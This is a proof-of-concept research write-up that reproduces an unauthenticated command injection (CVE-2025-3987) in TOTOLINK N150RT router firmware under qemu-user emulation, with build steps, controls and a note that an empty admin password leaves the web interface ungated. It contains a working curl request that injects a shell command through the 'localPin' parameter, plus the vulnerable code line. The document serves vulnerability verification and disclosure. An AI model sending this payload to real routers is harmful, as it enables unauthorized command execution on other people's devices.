# PoC 05 — the same class of chain, on an image anyone can download

G4's third clause asks for a reproduction path that needs no hardware and no
artefact peculiar to this desk. This is that path, and the honest form of it is
narrower than the clause originally assumed.

## Scope

| | |
|---|---|
| verified in emulation, **published image only** | V2.1.2-B20150825, `qemu-user`. Unauthenticated `POST /boafrm/formWsc` with `localPin` executed a command; the marker file it wrote contains `TOTOLINK-N150RT-V2.1.2` |
| verified on hardware | the *same parameter on a different build* — `P3-5`, 2018-01-10 build, nine named bytes on the SPI NOR ([`03`](03-flash-evidence.md)) |
| present statically, **not executed here** | V3.4.0-B20201030 — same `sprintf`/`system()` line, not run |
| **not reproducible on any published image** | the chain [`02`](02-command-injection.md) documents. `formSysCmd` is in neither downloadable image's dispatch table — see below |
| **not reproduced here** | link ① of the L1 chain, the unauthenticated `GET /config.dat`. The emulated server cannot serve it, and the reason is the same line that makes the L1 chain interesting |

## What this does and does not close

G4 clause 3 was written as *"the same chain, on a public image"*. It is split,
because half of it is impossible for a reason worth more than the clause:

- **3a — an L2 path exists for the command-injection primitive.** ✅ Met, below.
- **3b — an L2 path exists for the *L1 chain*.** ❌ Impossible by construction.
  `formSysCmd` (CVE-2024-51228) appears in the `root_form[]` table of this unit's
  build at `0x0044ee2c` and **in neither published image**
  ([`ghidra-formtable-2.1.2.json`](../reports/ghidra-formtable-2.1.2.json),
  [`-3.4.0`](../reports/ghidra-formtable-3.4.0.json)). A CVE naming a build that
  nobody can download cannot be reproduced by anybody who does not own one.

The second of those is the finding. It is not a shortfall to be worked around
later.

## Building the environment

```bash
sudo tools/qemu-env.sh --profile v2.1.2 mkflash
sudo tools/qemu-env.sh --profile v2.1.2 build
sudo tools/qemu-env.sh --profile v2.1.2 serve 8081
```

The image is deterministic and its sha256 is pinned in the profile, so a
different hash means a different container, not a different mood.

## What is in the download, and what is not

The published `.web` container has exactly three sections, each declaring the
flash offset it burns to:

| flash | section | source |
|---|---|---|
| `0x010000` | `w6cg`, 308,882 B | published image |
| `0x060000` | `cr6c`, 985,106 B | published image |
| `0x180000` | `r6cr`, 2,174,978 B | published image |

**The first 64 KiB is in no published image**: boot loader, `H601` (hardware
setting), `COMPDS` and `COMPCS` are written at manufacture. A flash containing
only what the container declares reaches exactly this far:

```text
Invalid hw setting signature [sig=  ]!
Initialize AP MIB failed!
```

so the emulation route that "download it and run it" implies does not exist.
Three regions are therefore synthesised, and
[`reports/mkflash-2.1.2.json`](../reports/mkflash-2.1.2.json) names every byte
range and where it came from. 82.9 % of the image is reconstructed from the
download; none of the remainder is copied from any physical unit.

| flash | region | how |
|---|---|---|
| `0x6000` | `H601`, 1,172 B | [`tools/mkhwsetting.py`](../tools/mkhwsetting.py) — `H6` / `01` / `u16 len`, payload zeroed, checksum computed |
| `0x8000` | `COMPDS`, 3,909 B | [`tools/mkcompds.py`](../tools/mkcompds.py) — all-zero MIB, LZSS-encoded, round-tripped through the vendor's own decoder |
| `0xC000` | `COMPCS`, 3,909 B | as above, signature `6g` |

The length is not guessed. `libapmib` states it when it refuses:
`Expect [sig=6G, ver=3, len=32858]!` — and 32,858 is a *different* number from
this unit's 45,218, which is one more way the two builds are not the same
firmware.

> **What the synthetic configuration costs.** Every setting in it is zero: no
> address, no SSID, no password. Nothing about shipped defaults may be concluded
> from this environment. The vendor's own `flash default` would generate the
> real thing "from hard code" and it **cannot run here** — it dies on an
> unaligned store (`SIGBUS`, `si_addr=0x004332a7`) that the device's MIPS kernel
> fixes in its trap handler and `qemu-user` does not. That single behavioural
> difference is the reason Realtek-SDK userland resists emulation from a
> download, and it is measured here rather than asserted.

## The gate, before anything is attacked

`serve` refuses to report the server up unless an exempt page is served **and** a
gated page is redirected — the model read at instruction level in W04-2 and
measured on silicon in W05.

```text
control ok: login.htm 200 (exempt page served)
control ok: blank.htm 302 (gated page redirected)
```

On first standing up, `blank.htm` returned **200**, not 302, and the control
correctly refused. The cause was not a broken environment: the synthetic MIB has
an empty `USER_PASSWORD`, and with no password configured the gate lets
everything through. Setting one through the vendor's own binary turned the gate
on:

| `USER_PASSWORD` | `blank.htm` |
|---|---|
| `""` (synthetic default) | **200** — ungated |
| set via `flash set` | **302** — gated |

That is an independent confirmation of `P10-4` — *an empty admin password leaves
the whole device unauthenticated* — on a **different build**, from a **published
image**, and it arrived as a side effect of a control refusing to lie.

## The chain link

```bash
curl -s -o /dev/null -m 15 -X POST http://127.0.0.1:8081/boafrm/formWsc \
  --data-urlencode 'localPin=1;<command>;#' --data 'submit-url=/wireless.htm'
```

No credentials. This is CVE-2025-3987, published, and it reaches

```c
sprintf(buf[100], "flash set HW_WLAN0_WSC_PIN %s", localPin);  system(buf);
```

`qemu-user`'s own syscall trace is the primary evidence, because the HTTP
response carries nothing:

```text
3540 fork() = 3550
3550 execve("/bin/sh",{"sh","-c",
     "flash set HW_WLAN0_WSC_PIN 1;cat /etc/version > /var/web/l2pin.txt;#",NULL})
```

and the second channel is the document root, fetched over HTTP afterwards:
the file exists and contains `TOTOLINK-N150RT-V2.1.2` — the published build
naming itself through a command it was made to run.

### The controls, which are the part that matters

Two other parameters on the **same handler in the same session**, identical
request shape:

| parameter | marker file created |
|---|---|
| `localPin` | **yes** — `TOTOLINK-N150RT-V2.1.2` |
| `peerPin` | no |
| `targetAPSsid` | no |

An absence on its own proves nothing; three requests differing in one field, of
which exactly one executes, is a discriminating control. It also **matches the
device**: W06 refuted `peerPin` (`P3-1`) and found `targetAPSsid` is not an
injection (`P3-4`) on the 2018 build, and the published 2015 build discriminates
the same three ways. Two environments, five years of firmware apart, agreeing on
which parameter is the defect.

## Two things that will bite anyone repeating this

- **`boa` does not survive the request.** It answers `HTTP 000` — the connection
  closes with no response — and the process is gone. One request per server
  instance; a second measurement against the same instance is measuring a
  corpse. The first attempt here fired a control request first, killed the
  server with it, and recorded the real payload as producing nothing. The null
  result was the harness's, not the firmware's.
- **`flash set` prints `Bus error` and the write still lands.** The unaligned
  store is after the commit. Read the value back rather than believing the exit
  status.

## What this is not

It is not the L1 chain, and it is not evidence about this unit. It is evidence
that the *class* of defect reproduces on firmware anyone can obtain, using an
environment anyone can rebuild from a pinned hash — which is what a reader
without the hardware can check for themselves, and the only thing they can.
